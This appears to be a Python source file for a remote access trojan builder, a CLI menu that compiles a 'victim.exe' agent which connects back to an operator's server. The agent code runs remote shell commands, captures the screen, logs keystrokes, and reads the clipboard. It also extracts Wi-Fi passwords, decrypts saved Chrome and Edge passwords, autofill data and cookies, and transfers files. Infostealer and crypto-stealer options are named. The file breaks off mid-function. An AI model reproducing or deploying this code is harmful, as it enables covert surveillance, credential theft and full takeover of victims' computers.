
import asyncio
import os
import sys
import json

from core.display import C, type_line, SEPARATOR, print_banner
from core.platform_utils import clear_screen
from cli.prompts import safe_input, press_enter


def option_rat():
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}REMOTE ACCESS TOOL{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()
    print(f"  {C.GRAY}Build and manage remote access agents{C.RESET}")
    print()
    print(f"  {C.DK_CYN}{C.BOLD}[1]{C.RESET} Build victim.exe")
    print(f"  {C.DK_CYN}{C.BOLD}[2]{C.RESET} Build hacker.exe (GUI)")
    print(f"  {C.DK_CYN}{C.BOLD}[3]{C.RESET} Run hacker server (GUI)")
    print()
    print(f"  {C.DK_MAG}{'─' * 40}{C.RESET}")
    print(f"  {C.DK_CYN}{C.BOLD}[0]{C.RESET} Back")
    print()

    choice = safe_input(f"Choice: ").strip()

    if choice == "0":
        return
    elif choice == "1":
        _build_victim()
    elif choice == "2":
        _build_hacker()
    elif choice == "3":
        _run_hacker_server()
    else:
        type_line(f"  {C.DK_RED}Invalid choice.{C.RESET}")
        press_enter()


def _build_victim():
    server_ip = safe_input("Server IP to connect to: ").strip()
    if not server_ip:
        type_line(f"  {C.DK_RED}No IP provided.{C.RESET}")
        press_enter()
        return

    port_str = safe_input("Server port (default 5555): ").strip()
    port = int(port_str) if port_str.isdigit() else 5555

    password = safe_input("Auth password (optional): ").strip()

    output_name = safe_input("Output filename (default: victim): ").strip()
    if not output_name:
        output_name = "victim"
    if not output_name.endswith(".exe"):
        output_name += ".exe"

    type_line(f"\n  {C.GRAY}Building {output_name}...{C.RESET}")

    script = _generate_victim_script(server_ip, port, password)
    script_name = output_name.replace(".exe", "_agent.py")
    script_path = script_name
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(script)

    exe_name = output_name.replace(".exe", "")

    try:
        import PyInstaller.__main__  # pyright: ignore[reportMissingModuleSource]
        from pathlib import Path
        hooks_dir = str(Path(__file__).resolve().parent.parent.parent / "hooks")
        PyInstaller.__main__.run([
            script_path,
            "--onefile",
            "--windowed",
            "--noconfirm",
            "--clean",
            "--name", exe_name,
            "--additional-hooks-dir", hooks_dir,
            "--hidden-import", "pyautogui",
            "--hidden-import", "mss",
            "--hidden-import", "mss.windows",
            "--collect-all", "mss",
            "--hidden-import", "PIL",
            "--hidden-import", "PIL.Image",
            "--hidden-import", "pynput",
            "--hidden-import", "pynput.keyboard",
            "--hidden-import", "pynput.mouse",
            "--hidden-import", "pyperclip",
            "--hidden-import", "psutil",
        ])
        type_line(f"  {C.DK_CYN}{output_name} created in dist/{C.RESET}")
    except ImportError:
        type_line(f"  {C.DK_RED}PyInstaller not installed. Install with: pip install pyinstaller{C.RESET}")
        type_line(f"  {C.GRAY}Script saved to {script_path} - run manually with: python {script_path}{C.RESET}")
    except (Exception, SystemExit) as e:
        type_line(f"  {C.DK_RED}Build failed: {e}{C.RESET}")

    press_enter()


def _build_hacker():
    port_str = safe_input("Listening port (default 5555): ").strip()
    port = int(port_str) if port_str.isdigit() else 5555

    password = safe_input("Auth password (optional): ").strip()

    output_name = safe_input("Output filename (default: hacker): ").strip()
    if not output_name:
        output_name = "hacker"
    if not output_name.endswith(".exe"):
        output_name += ".exe"

    type_line(f"\n  {C.GRAY}Building {output_name}...{C.RESET}")

    script = _generate_hacker_script(port, password)
    script_name = output_name.replace(".exe", "_control.py")
    script_path = script_name
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(script)

    exe_name = output_name.replace(".exe", "")

    try:
        import PyInstaller.__main__  # pyright: ignore[reportMissingModuleSource]
        PyInstaller.__main__.run([
            script_path,
            "--onefile",
            "--windowed",
            "--noconfirm",
            "--clean",
            "--name", exe_name,
            "--hidden-import", "customtkinter",
            "--collect-all", "customtkinter",
            "--hidden-import", "tkinter",
            "--hidden-import", "PIL",
            "--hidden-import", "PIL.Image",
            "--hidden-import", "PIL._tkinter_finder",
        ])
        type_line(f"  {C.DK_CYN}{output_name} created in dist/{C.RESET}")
    except ImportError:
        type_line(f"  {C.DK_RED}PyInstaller not installed. Install with: pip install pyinstaller{C.RESET}")
        type_line(f"  {C.GRAY}Script saved to {script_path} - run manually with: python {script_path}{C.RESET}")
    except (Exception, SystemExit) as e:
        type_line(f"  {C.DK_RED}Build failed: {e}{C.RESET}")

    press_enter()


def _run_hacker_server():
    port_str = safe_input("Listening port (default 5555): ").strip()
    port = int(port_str) if port_str.isdigit() else 5555

    password = safe_input("Auth password (optional): ").strip()

    type_line(f"\n  {C.GRAY}Starting hacker server on port {port}...{C.RESET}\n")

    from features.rat.hacker_server import HackerServer
    from features.rat.hacker_gui import HackerGUI

    server = HackerServer(port=port, password=password)
    server.start()

    try:
        gui = HackerGUI(server)
        type_line(f"  {C.DK_CYN}GUI started. Waiting for victims...{C.RESET}")
        gui.run()
    except ImportError:
        type_line(f"  {C.DK_RED}GUI dependencies missing (customtkinter, Pillow){C.RESET}")
        type_line(f"  {C.GRAY}Running in headless mode. Press Ctrl+C to stop.{C.RESET}")
        try:
            while True:
                import time
                time.sleep(1)
        except KeyboardInterrupt:
            pass
    finally:
        server.stop()


def _generate_victim_script(server_ip: str, port: int, password: str) -> str:
    return f'''import socket
import json
import struct
import hashlib
import os
import platform
import subprocess
import threading
import time
import logging
try:
    import mss
except ImportError:
    mss = None

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", filename="victim.log", filemode="w")
logger = logging.getLogger("S9RAT")

PROTOCOL_VERSION = 2
DEFAULT_PORT = 5555
MAGIC = b"S9RAT"

MSG_TYPES = {{
    "AUTH": 1, "AUTH_OK": 2, "AUTH_FAIL": 3,
    "SCREEN_FRAME": 10, "SCREEN_START": 11, "SCREEN_STOP": 12,
    "SCREEN_SELECT": 13, "SCREEN_MONITORS": 14,
    "CONTROL_ENABLE": 20, "CONTROL_DISABLE": 21, "CONTROL_INPUT": 22,
    "EXFIL_DATA": 30, "EXFIL_REQUEST": 31, "FILE_LIST": 32, "FILE_TRANSFER": 33,
    "FILE_TRANSFER_DATA": 34, "FILE_TRANSFER_END": 35,
    "FILE_DOWNLOAD": 36, "FILE_BROWSE": 37, "SCREENSHOT": 38,
    "SYSTEM_INFO": 40, "WIFI_PASSWORDS": 41, "BROWSER_CREDS": 42,
    "HEARTBEAT": 50, "HEARTBEAT_ACK": 51, "DISCONNECT": 60,
    "SHUTDOWN": 70, "RESTART": 71, "LOGOFF": 72,
    "SHELL_EXEC": 80, "SHELL_OUTPUT": 81,
    "PROCESS_LIST": 82, "PROCESS_DATA": 83, "PROCESS_KILL": 84,
    "KEYLOG_START": 90, "KEYLOG_STOP": 91, "KEYLOG_DATA": 92,
    "CLIPBOARD_GET": 93, "CLIPBOARD_DATA": 94,
    "CHAT_SEND": 95, "CHAT_DISPLAY": 96,
}}


def pack_message(msg_type, data):
    msg_bytes = json.dumps(data).encode("utf-8")
    type_id = MSG_TYPES.get(msg_type, 0)
    header = MAGIC + struct.pack("!BI", type_id, len(msg_bytes))
    return header + msg_bytes


def pack_frame(frame_data):
    type_id = MSG_TYPES["SCREEN_FRAME"]
    header = MAGIC + struct.pack("!BI", type_id, len(frame_data))
    return header + frame_data


def recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(min(n - len(buf), 65536))
        if not chunk:
            raise ConnectionError("Connection closed")
        buf.extend(chunk)
    return bytes(buf)


def recv_message(sock):
    header = recv_exact(sock, 10)
    if header[:5] != MAGIC:
        raise ValueError("Invalid protocol magic")
    type_id = struct.unpack("!B", header[5:6])[0]
    length = struct.unpack("!I", header[6:10])[0]
    if length > 50 * 1024 * 1024:
        raise ValueError("Message too large")
    msg_bytes = recv_exact(sock, length)
    msg_type = None
    for name, tid in MSG_TYPES.items():
        if tid == type_id:
            msg_type = name
            break
    if not msg_type:
        msg_type = f"UNKNOWN_{{type_id}}"
    return msg_type, json.loads(msg_bytes.decode("utf-8"))


def recv_raw(sock, n):
    return recv_exact(sock, n)


def set_nodelay(sock):
    try:
        import socket as _socket
        sock.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
    except Exception:
        pass


class VictimClient:
    def __init__(self, server_host, server_port=DEFAULT_PORT, password=""):
        self.server_host = server_host
        self.server_port = server_port
        self.password = password
        self._sock = None
        self._running = False
        self._screen_active = False
        self._control_enabled = False
        self._selected_monitor = 0
        self._keylog_active = False
        self._keylog_buffer = []
        self._keylog_lock = threading.Lock()

    def connect(self):
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.settimeout(10)
            self._sock.connect((self.server_host, self.server_port))
            set_nodelay(self._sock)
            self._running = True
            self._authenticate()
            return True
        except Exception as e:
            logger.error(f"Connection failed: {{e}}")
            return False

    def _get_monitor_list(self):
        monitors = []
        if mss is not None:
            try:
                sct = mss.mss()
                for i, m in enumerate(sct.monitors):
                    if i == 0:
                        continue
                    monitors.append({{"index": i, "name": m.get("name", f"Monitor {{i}}"), "left": m["left"], "top": m["top"], "width": m["width"], "height": m["height"]}})
            except Exception:
                pass
        if not monitors:
            monitors = [{{"index": 0, "name": "Primary", "left": 0, "top": 0, "width": 1920, "height": 1080}}]
        return monitors

    def _authenticate(self):
        self._monitors = self._get_monitor_list()
        auth_msg = pack_message("AUTH", {{
            "password": self.password,
            "hostname": platform.node(),
            "username": os.getenv("USERNAME", os.getenv("USER", "unknown")),
            "os": platform.system(),
            "os_version": platform.version(),
            "arch": platform.machine(),
            "pid": os.getpid(),
            "protocol_version": PROTOCOL_VERSION,
            "monitors": self._monitors,
        }})
        self._sock.sendall(auth_msg)
        msg_type, data = recv_message(self._sock)
        if msg_type == "AUTH_OK":
            logger.info("Authenticated")
        else:
            raise ConnectionError("Authentication failed")

    def run(self):
        self._running = True
        threads = [
            threading.Thread(target=self._command_loop, daemon=True),
            threading.Thread(target=self._screen_loop, daemon=True),
            threading.Thread(target=self._heartbeat_loop, daemon=True),
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def _heartbeat_loop(self):
        while self._running:
            try:
                self._sock.sendall(pack_message("HEARTBEAT_ACK", {{}}))
            except Exception:
                break
            time.sleep(15)

    def _command_loop(self):
        while self._running:
            try:
                msg_type, data = recv_message(self._sock)
                self._handle_command(msg_type, data)
            except ConnectionError:
                logger.info("Disconnected")
                self._running = False
                break
            except Exception as e:
                logger.error(f"Command error: {{e}}")
                time.sleep(0.1)

    def _handle_command(self, msg_type, data):
        if msg_type == "HEARTBEAT":
            self._sock.sendall(pack_message("HEARTBEAT_ACK", {{}}))
        elif msg_type == "SCREEN_START":
            self._screen_active = True
        elif msg_type == "SCREEN_STOP":
            self._screen_active = False
        elif msg_type == "SCREEN_SELECT":
            self._selected_monitor = data.get("monitor_index", 0)
        elif msg_type == "CONTROL_ENABLE":
            self._control_enabled = True
        elif msg_type == "CONTROL_DISABLE":
            self._control_enabled = False
        elif msg_type == "CONTROL_INPUT" and self._control_enabled:
            self._execute_input(data)
        elif msg_type == "EXFIL_REQUEST":
            self._handle_exfil(data.get("type", ""))
        elif msg_type == "SHUTDOWN":
            self._power_action("shutdown")
        elif msg_type == "RESTART":
            self._power_action("restart")
        elif msg_type == "LOGOFF":
            self._power_action("logoff")
        elif msg_type == "SHELL_EXEC":
            self._handle_shell_exec(data)
        elif msg_type == "PROCESS_LIST":
            self._handle_process_list()
        elif msg_type == "PROCESS_KILL":
            self._handle_process_kill(data)
        elif msg_type == "KEYLOG_START":
            self._start_keylog()
        elif msg_type == "KEYLOG_STOP":
            self._stop_keylog()
        elif msg_type == "CLIPBOARD_GET":
            self._handle_clipboard()
        elif msg_type == "CHAT_SEND":
            self._handle_chat_display(data)
        elif msg_type == "SCREENSHOT":
            self._take_screenshot()
        elif msg_type == "FILE_BROWSE":
            self._handle_file_browse(data)
        elif msg_type == "FILE_TRANSFER":
            self._handle_file_transfer_init(data)
        elif msg_type == "FILE_DOWNLOAD":
            self._handle_file_download(data)

    def _execute_input(self, data):
        try:
            import pyautogui
            input_type = data.get("input_type", "")
            x = data.get("x", 0)
            y = data.get("y", 0)
            if self._selected_monitor > 0 and mss is not None:
                sct = mss.mss()
                if self._selected_monitor < len(sct.monitors):
                    mon = sct.monitors[self._selected_monitor]
                    x += mon["left"]
                    y += mon["top"]
            if input_type == "mouse_move":
                pyautogui.moveTo(x, y, duration=0.02)
            elif input_type == "mouse_click":
                pyautogui.click(x, y, button=data.get("button", "left"))
            elif input_type == "mouse_double":
                pyautogui.doubleClick(x, y)
            elif input_type == "mouse_down":
                pyautogui.mouseDown(x, y, button=data.get("button", "left"))
            elif input_type == "mouse_up":
                pyautogui.mouseUp(x, y, button=data.get("button", "left"))
            elif input_type == "mouse_scroll":
                pyautogui.scroll(data.get("amount", 0), x, y)
            elif input_type == "key_press":
                pyautogui.press(data.get("key", ""))
            elif input_type == "key_down":
                pyautogui.keyDown(data.get("key", ""))
            elif input_type == "key_up":
                pyautogui.keyUp(data.get("key", ""))
            elif input_type == "type_text":
                pyautogui.typewrite(data.get("text", ""), interval=0.01)
        except Exception as e:
            logger.error(f"Input error: {{e}}")

    def _screen_loop(self):
        if mss is None:
            logger.error("mss not installed for screen capture")
            return
        try:
            import io
            from PIL import Image
            sct = mss.mss()
        except Exception as e:
            logger.error(f"Init error: {{e}}")
            return
        while self._running:
            if self._screen_active:
                try:
                    monitors = sct.monitors
                    idx = self._selected_monitor
                    if idx < len(monitors):
                        monitor = monitors[idx] if idx > 0 else monitors[0]
                    else:
                        monitor = monitors[0]
                    screenshot = sct.grab(monitor)
                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                    buf = io.BytesIO()
                    img.save(buf, format="JPEG", quality=50, optimize=False)
                    frame_data = buf.getvalue()
                    self._sock.sendall(pack_message("SCREEN_FRAME", {{"size": len(frame_data)}}))
                    self._sock.sendall(frame_data)
                except Exception as e:
                    logger.error(f"Screen capture error: {{e}}")
                    time.sleep(0.5)
            time.sleep(0.05)

    def _power_action(self, action):
        try:
            if platform.system() == "Windows":
                if action == "shutdown":
                    subprocess.run("shutdown /s /t 0", shell=True)
                elif action == "restart":
                    subprocess.run("shutdown /r /t 0", shell=True)
                elif action == "logoff":
                    subprocess.run("shutdown /l", shell=True)
            else:
                if action == "shutdown":
                    subprocess.run("shutdown -h now", shell=True)
                elif action == "restart":
                    subprocess.run("shutdown -r now", shell=True)
                elif action == "logoff":
                    subprocess.run("logout", shell=True)
        except Exception as e:
            logger.error(f"Power action error: {{e}}")

    def _handle_shell_exec(self, data):
        cmd = data.get("command", "")
        if not cmd:
            return
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30, encoding="utf-8", errors="replace")
            output = result.stdout + result.stderr
            self._sock.sendall(pack_message("SHELL_OUTPUT", {{"command": cmd, "output": output[:50000], "returncode": result.returncode}}))
        except subprocess.TimeoutExpired:
            self._sock.sendall(pack_message("SHELL_OUTPUT", {{"command": cmd, "output": "[timeout after 30s]", "returncode": -1}}))
        except Exception as e:
            self._sock.sendall(pack_message("SHELL_OUTPUT", {{"command": cmd, "output": str(e), "returncode": -1}}))

    def _handle_process_list(self):
        try:
            import psutil
            procs = []
            for p in psutil.process_iter(["pid", "name", "username", "cpu_percent", "memory_percent"]):
                try:
                    info = p.info
                    procs.append({{"pid": info["pid"], "name": info["name"], "username": info.get("username", ""), "cpu": round(info.get("cpu_percent", 0), 1), "memory": round(info.get("memory_percent", 0), 1)}})
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            self._sock.sendall(pack_message("PROCESS_DATA", {{"processes": procs}}))
        except ImportError:
            self._sock.sendall(pack_message("PROCESS_DATA", {{"error": "psutil not installed"}}))

    def _handle_process_kill(self, data):
        pid = data.get("pid", 0)
        try:
            import psutil
            p = psutil.Process(pid)
            p.kill()
            self._sock.sendall(pack_message("PROCESS_DATA", {{"killed": pid}}))
        except Exception as e:
            self._sock.sendall(pack_message("PROCESS_DATA", {{"error": str(e)}}))

    def _start_keylog(self):
        if self._keylog_active:
            return
        self._keylog_active = True
        self._keylog_buffer = []
        threading.Thread(target=self._keylog_loop, daemon=True).start()

    def _stop_keylog(self):
        self._keylog_active = False

    def _keylog_loop(self):
        try:
            from pynput import keyboard
            def on_press(key):
                if not self._keylog_active:
                    return False
                try:
                    char = key.char
                    if char:
                        with self._keylog_lock:
                            self._keylog_buffer.append(char)
                except AttributeError:
                    name = str(key).replace("Key.", "")
                    with self._keylog_lock:
                        self._keylog_buffer.append(f"[{{name}}]")
            with keyboard.Listener(on_press=on_press) as listener:
                while self._keylog_active:
                    time.sleep(2)
                    with self._keylog_lock:
                        if self._keylog_buffer:
                            data = "".join(self._keylog_buffer)
                            self._keylog_buffer = []
                        else:
                            data = ""
                    if data:
                        try:
                            self._sock.sendall(pack_message("KEYLOG_DATA", {{"keys": data}}))
                        except Exception:
                            break
                    time.sleep(0.5)
        except ImportError:
            logger.error("pynput not installed for keylogger")
            self._keylog_active = False
        except Exception as e:
            logger.error(f"Keylog error: {{e}}")
            self._keylog_active = False

    def _handle_clipboard(self):
        try:
            import pyperclip
            content = pyperclip.paste()
            self._sock.sendall(pack_message("CLIPBOARD_DATA", {{"content": str(content)}}))
        except ImportError:
            try:
                if platform.system() == "Windows":
                    result = subprocess.run("powershell -command Get-Clipboard", shell=True, capture_output=True, text=True, timeout=5)
                    self._sock.sendall(pack_message("CLIPBOARD_DATA", {{"content": result.stdout.strip()}}))
                else:
                    self._sock.sendall(pack_message("CLIPBOARD_DATA", {{"content": ""}}))
            except Exception:
                self._sock.sendall(pack_message("CLIPBOARD_DATA", {{"content": ""}}))

    def _handle_chat_display(self, data):
        msg = data.get("message", "")
        if not msg:
            return
        try:
            if platform.system() == "Windows":
                try:
                    import ctypes
                    ctypes.windll.user32.MessageBoxW(0, msg, "S9Checker Message", 0x40 | 0x1000)
                except Exception:
                    subprocess.run(f'msg * "{{msg}}"', shell=True, timeout=5)
            else:
                subprocess.run(f'notify-send "S9Checker" "{{msg}}"', shell=True, timeout=5)
        except Exception as e:
            logger.error(f"Chat display error: {{e}}")

    def _handle_exfil(self, exfil_type):
        data = {{}}
        try:
            if exfil_type == "system_info":
                data = self._get_system_info()
            elif exfil_type == "wifi_passwords":
                data = self._get_wifi_passwords()
            elif exfil_type == "browser_creds":
                data = self._get_browser_creds()
            elif exfil_type == "file_list":
                data = self._get_file_list()
            elif exfil_type == "geolocation":
                data = self._get_geolocation()
            elif exfil_type == "browser_cookies":
                data = self._get_browser_cookies()
            elif exfil_type == "infostealer":
                data = self._get_infostealer()
            elif exfil_type == "crypto_stealer":
                data = self._get_crypto_stealer()
        except Exception as e:
            data = {{"error": str(e)}}
        self._sock.sendall(pack_message("EXFIL_DATA", {{"type": exfil_type, "data": data}}))

    def _get_system_info(self):
        info = {{
            "hostname": platform.node(),
            "username": os.getenv("USERNAME", os.getenv("USER", "unknown")),
            "os": platform.system(),
            "os_version": platform.version(),
            "arch": platform.machine(),
            "processor": platform.processor(),
            "cwd": os.getcwd(),
            "python_version": platform.python_version(),
        }}
        try:
            result = subprocess.run(
                "ipconfig" if platform.system() == "Windows" else "ifconfig",
                shell=True, capture_output=True, text=True, timeout=5
            )
            info["network"] = result.stdout[:2000]
        except Exception:
            pass
        return info

    def _get_wifi_passwords(self):
        passwords = {{}}
        try:
            if platform.system() == "Windows":
                result = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True, timeout=10)
                profiles = []
                for line in result.stdout.split("\\n"):
                    if "All User Profile" in line:
                        profile = line.split(":")[-1].strip()
                        profiles.append(profile)
                for profile in profiles:
                    result = subprocess.run(f'netsh wlan show profile name="{{profile}}" key=clear', shell=True, capture_output=True, text=True, timeout=10)
                    for line in result.stdout.split("\\n"):
                        if "Key Content" in line:
                            pwd = line.split(":")[-1].strip()
                            passwords[profile] = pwd
        except Exception as e:
            passwords["_error"] = str(e)
        return passwords

    def _get_browser_creds(self):
        creds = {{"chrome": [], "edge": [], "autofill": []}}
        try:
            if platform.system() == "Windows":
                import sqlite3
                import shutil
                import json
                import base64

                def _decrypt_chrome_password(encrypted_password, local_state_path):
                    try:
                        with open(local_state_path, "r", encoding="utf-8") as f:
                            local_state = json.load(f)
                        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                        encrypted_key = encrypted_key[5:]
                        import ctypes
                        import ctypes.wintypes

                        class DATA_BLOB(ctypes.Structure):
                            _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

                        blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key, len(encrypted_key)))
                        blob_out = DATA_BLOB()
                        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                            aes_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                        else:
                            return "[decryption failed]"
                        if encrypted_password[:3] == b"v10":
                            nonce = encrypted_password[3:15]
                            ciphertext = encrypted_password[15:-16]
                            tag = encrypted_password[-16:]
                            from Crypto.Cipher import AES
                            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
                            return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="replace")
                        return "[unsupported format]"
                    except Exception:
                        return "[decryption failed]"

                def _read_browser_logins(user_data_path, profile="Default"):
                    logins = []
                    login_db = os.path.join(user_data_path, profile, "Login Data")
                    local_state = os.path.join(user_data_path, "Local State")
                    if not os.path.exists(login_db):
                        return logins
                    temp_path = login_db + ".tmp"
                    try:
                        shutil.copy2(login_db, temp_path)
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for row in cursor:
                            password = "[encrypted]"
                            if row[2]:
                                password = _decrypt_chrome_password(row[2], local_state)
                            logins.append({{"url": row[0], "username": row[1], "password": password}})
                        conn.close()
                        os.remove(temp_path)
                    except Exception:
                        try:
                            os.remove(temp_path)
                        except Exception:
                            pass
                    return logins

                def _read_autofill(user_data_path, profile="Default"):
                    entries = []
                    web_data = os.path.join(user_data_path, profile, "Web Data")
                    if not os.path.exists(web_data):
                        return entries
                    temp_path = web_data + ".tmp"
                    try:
                        shutil.copy2(web_data, temp_path)
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.execute("SELECT name, value FROM autofill")
                        for row in cursor:
                            if row[0] and row[1]:
                                entries.append({{"field": row[0], "value": row[1]}})
                        conn.close()
                        os.remove(temp_path)
                    except Exception:
                        try:
                            os.remove(temp_path)
                        except Exception:
                            pass
                    return entries

                chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data")
                if os.path.exists(chrome_path):
                    creds["chrome"] = _read_browser_logins(chrome_path, "Default")
                    creds["autofill"] = _read_autofill(chrome_path, "Default")

                edge_path = os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data")
                if os.path.exists(edge_path):
                    creds["edge"] = _read_browser_logins(edge_path, "Default")
                    if not creds["autofill"]:
                        creds["autofill"] = _read_autofill(edge_path, "Default")
        except Exception as e:
            creds["_error"] = str(e)
        return creds

    def _get_file_list(self):
        listing = {{}}
        for drive in ["C:\\\\", "D:\\\\"]:
            if os.path.exists(drive):
                try:
                    entries = os.listdir(drive)[:100]
                    listing[drive] = entries
                except Exception:
                    pass
        return listing

    def _take_screenshot(self):
        try:
            sct = mss.mss()
            monitors = sct.monitors
            idx = self._selected_monitor
            if idx < len(monitors):
                monitor = monitors[idx] if idx > 0 else monitors[0]
            else:
                monitor = monitors[0]
            screenshot = sct.grab(monitor)
            try:
                from PIL import Image
                img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                import io
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=70, optimize=False)
                frame_data = buf.getvalue()
            except Exception:
                frame_data = bytes(screenshot.rgb)
            self._sock.sendall(pack_message("SCREEN_FRAME", {{"size": len(frame_data)}}))
            self._sock.sendall(frame_data)
        except Exception as e:
            logger.error(f"Screenshot error: {{e}}")

    def _handle_file_browse(self, data):
        path = data.get("path", "")
        entries = []
        try:
            if not path:
                if platform.system() == "Windows":
                    import string
                    for letter in string.ascii_uppercase:
                        drive = f"{{letter}}:\\\\"
                        if os.path.exists(drive):
                            try:
                                st = os.stat(drive)
                                entries.append({{"name": drive, "is_dir": True, "size": 0, "modified": st.st_mtime}})
                            except Exception:
                                entries.append({{"name": drive, "is_dir": True, "size": 0, "modified": 0}})
                else:
                    entries.append({{"name": "/", "is_dir": True, "size": 0, "modified": 0}})
            else:
                for item in os.scandir(path):
                    try:
                        st = item.stat()
                        entries.append({{
                            "name": item.name,
                            "is_dir": item.is_dir(),
                            "size": st.st_size if not item.is_dir() else 0,
                            "modified": st.st_mtime,
                        }})
                    except PermissionError:
                        entries.append({{"name": item.name, "is_dir": item.is_dir(), "size": 0, "modified": 0}})
                    except Exception:
                        pass
        except Exception as e:
            logger.error(f"File browse error: {{e}}")
        self._sock.sendall(pack_message("EXFIL_DATA", {{
            "type": "file_browse",
            "data": {{"path": path, "entries": entries}},
        }}))

    def _handle_file_transfer_init(self, data):
        filename = data.get("filename", "")
        size = data.get("size", 0)
        dest_path = data.get("dest_path", "")
        if not dest_path:
            dest_path = os.path.join(os.environ.get("TEMP", os.getcwd()), filename)
        try:
            self._sock.sendall(pack_message("FILE_TRANSFER_DATA", {{"status": "ready"}}))
            received = 0
            with open(dest_path, "wb") as f:
                while received < size:
                    chunk_size = min(65536, size - received)
                    chunk = recv_raw(self._sock, chunk_size)
                    f.write(chunk)
                    received += len(chunk)
            self._sock.sendall(pack_message("FILE_TRANSFER_END", {{
                "status": "done", "path": dest_path, "size": received,
            }}))
            logger.info(f"File received: {{dest_path}} ({{received}} bytes)")
        except Exception as e:
            logger.error(f"File transfer error: {{e}}")
            try:
                self._sock.sendall(pack_message("FILE_TRANSFER_END", {{
                    "status": "error", "error": str(e),
                }}))
            except Exception:
                pass

    def _handle_file_download(self, data):
        path = data.get("path", "")
        try:
            if not os.path.exists(path):
                self._sock.sendall(pack_message("EXFIL_DATA", {{
                    "type": "file_download",
                    "data": {{"error": "File not found", "path": path}},
                }}))
                return
            size = os.path.getsize(path)
            filename = os.path.basename(path)
            self._sock.sendall(pack_message("FILE_DOWNLOAD_DATA", {{
                "filename": filename, "size": size,
            }}))
            with open(path, "rb") as f:
                while True:
                    chunk = f.read(65536)
                    if not chunk:
                        break
                    self._sock.sendall(chunk)
            logger.info(f"File sent: {{path}} ({{size}} bytes)")
        except Exception as e:
            logger.error(f"File download error: {{e}}")

    def _get_geolocation(self):
        try:
            import urllib.request
            resp = urllib.request.urlopen("http://ip-api.com/json/", timeout=10)
            data = json.loads(resp.read())
            return {{
                "ip": data.get("query", ""),
                "city": data.get("city", ""),
                "region": data.get("regionName", ""),
                "country": data.get("country", ""),
                "country_code": data.get("countryCode", ""),
                "lat": data.get("lat", ""),
                "lon": data.get("lon", ""),
                "isp": data.get("isp", ""),
                "org": data.get("org", ""),
                "as": data.get("as", ""),
                "timezone": data.get("timezone", ""),
            }}
        except Exception as e:
            return {{"error": str(e)}}

    def _get_browser_cookies(self):
        result = {{"chrome": [], "edge": []}}
        try:
            if platform.system() == "Windows":
                import sqlite3
                import shutil
                import base64

                def _decrypt_value(encrypted_value, local_state_path):
                    try:
                        with open(local_state_path, "r", encoding="utf-8") as f:
                            local_state = json.load(f)
                        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                        encrypted_key = encrypted_key[5:]
                        import ctypes
                        import ctypes.wintypes

                        class DATA_BLOB(ctypes.Structure):
                            _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

                        blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key, len(encrypted_key)))
                        blob_out = DATA_BLOB()
                        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                            aes_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                        else:
                            return ""
                        if encrypted_value[:3] == b"v10":
                            nonce = encrypted_value[3:15]
                            ciphertext = encrypted_value[15:-16]
                            tag = encrypted_value[-16:]
                            from Crypto.Cipher import AES
                            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
                            return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="replace")
                        return ""
                    except Exception:
                        return ""

                def _read_cookies(browser_name, user_data_path):
                    cookies = []
                    cookies_db = os.path.join(user_data_path, "Default", "Network", "Cookies")
                    local_state = os.path.join(user_data_path, "Local State")
                    if not os.path.exists(cookies_db):
                        cookies_db = os.path.join(user_data_path, "Default", "Cookies")
                    if not os.path.exists(cookies_db):
                        return cookies
                    temp_path = cookies_db + ".tmp"
                    try:
                        shutil.copy2(cookies_db, temp_path)
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.execute(
                            "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies "
                            "WHERE host_key NOT LIKE '%google%' OR host_key LIKE '%gmail%' OR host_key LIKE '%youtube%'"
                        )
                        for row in cursor:
                            value = ""
                            if row[2]:
                                value = _decrypt_value(row[2], local_state)
                            if not value:
                                value = "[encrypted]"
                            cookies.append({{
                                "host": row[0],
                                "name": row[1],
                                "value": value,
                                "path": row[3],
                                "expires": row[4],
                                "secure": bool(row[5]),
                                "httponly": bool(row[6]),
                            }})
                        conn.close()
                        os.remove(temp_path)
                    except Exception:
                        try:
                            os.remove(temp_path)
